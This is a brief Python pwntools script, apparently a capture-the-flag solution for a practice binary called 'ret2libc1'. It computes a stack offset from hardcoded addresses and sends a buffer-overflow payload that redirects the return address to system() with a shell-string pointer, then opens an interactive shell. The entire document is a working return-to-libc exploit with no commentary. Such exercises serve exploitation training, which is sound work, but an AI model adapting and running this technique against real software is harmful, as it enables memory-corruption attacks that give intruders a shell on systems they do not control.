from pwn import *

shell_addr = 0x08048720
sys_call = 0x08048460

eax = 0xffffd24c
ebp = 0xffffd2b8
offset = int(ebp-eax+4)

payload = b'a'*offset + p32(sys_call) + b'a'*4 + p32(shell_addr)

sh = process('./ret2libc1')
sh.sendline(payload)
sh.interactive()

